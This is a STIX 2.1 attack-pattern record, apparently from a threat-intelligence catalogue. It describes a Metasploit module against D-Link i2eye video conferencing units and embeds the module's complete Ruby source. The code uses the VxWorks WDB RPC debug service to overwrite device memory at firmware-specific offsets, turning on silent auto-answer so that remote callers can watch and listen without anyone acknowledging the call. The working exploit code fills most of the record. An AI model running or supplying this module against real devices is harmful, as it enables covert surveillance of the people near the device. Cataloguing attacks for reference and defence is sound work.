{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5312bf34-3546-4c0d-91bd-4434909f5921",
    "created": "2024-08-14T16:22:34.942016Z",
    "modified": "2024-08-14T16:22:34.94202Z",
    "name": "D-Link i2eye Video Conference AutoAnswer (WDBRPC)",
    "description": " This module can be used to enable auto-answer mode for the D-Link i2eye video conferencing system. Once this setting has been flipped the device will accept incoming video calls without acknowledgement. The NetMeeting software included in Windows XP can be used to connect to this device. The i2eye product is no longer supported by the vendor and all models have reached their end of life (EOL). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vxworks/dlink_i2eye_autoanswer.rb",
            "external_id": "dlink_i2eye_autoanswer.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WDBRPC_Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link i2eye Video Conference AutoAnswer (WDBRPC)',\n      'Description'    => %q{\n        This module can be used to enable auto-answer mode for the D-Link\n      i2eye video conferencing system. Once this setting has been flipped,\n      the device will accept incoming video calls without acknowledgement.\n      The NetMeeting software included in Windows XP can be used to connect\n      to this device. The i2eye product is no longer supported by the vendor\n      and all models have reached their end of life (EOL).\n      },\n      'Author'         => [ 'hdm'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '66842'],\n          ['URL', 'https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/'],\n          ['US-CERT-VU', '362332']\n        ]\n      ))\n  end\n\n  def run\n    target  = nil\n    targets = {\n      # Original firmware for the North America DVC1000\n      \"Sorenson VP100 - ARM9TDMI\"   => [[0x00229a05, 0x00000000, 0x00000001]],\n\n      # Final firmware for the North America DVC1000\n      # Also covers a mislabeled \"Sorenson VP100\" (revision A3)\n      \"i-2-eye DVC1000 - ARM9TDMI\"  => [\n        [0x0040cd68, 0x00000000, 0x01000000],\n        [0x0040af38, 0x00000000, 0x01000000],\n        [0x0040cd00, 0x00000000, 0x01000000]\n      ],\n    }\n\n\n    wdbrpc_client_connect\n\n    if not @wdbrpc_info[:rt_vers]\n      print_error(\"No response to connection request\")\n      return\n    end\n\n    membase = @wdbrpc_info[:rt_membase]\n\n    target = targets[@wdbrpc_info[:rt_bsp_name]]\n    if not target\n      print_error(\"No target available for BSP #{@wdbrpc_info[:rt_bsp_name]}\")\n      wdbrpc_client_disconnect\n      return\n    end\n\n    target.each do |r|\n      offset, oldval, newval = r\n\n      curr = wdbrpc_client_memread(membase + offset, 4).unpack(\"N\")[0]\n      if curr != oldval and curr != newval\n        print_error(\"The value at offset #{\"0x%.8x\" % offset} does not match this target (#{\"0x%.8x\" % curr}), skipping...\")\n        next\n      end\n\n      if curr == newval\n        print_good(\"The value at offset #{\"0x%.8x\" % offset} has already been set\")\n      else\n        wdbrpc_client_memwrite(membase + offset, [newval].pack(\"N\"))\n        curr = wdbrpc_client_memread(membase + offset, 4).unpack(\"N\")[0]\n        print_good(\"The value at offset #{\"0x%.8x\" % offset} has been set to #{\"0x%.8x\" % curr}\")\n      end\n\n      print_status(\"The target device should now automatically accept incoming calls\")\n    end\n\n    wdbrpc_client_disconnect\n  end\nend\n"
}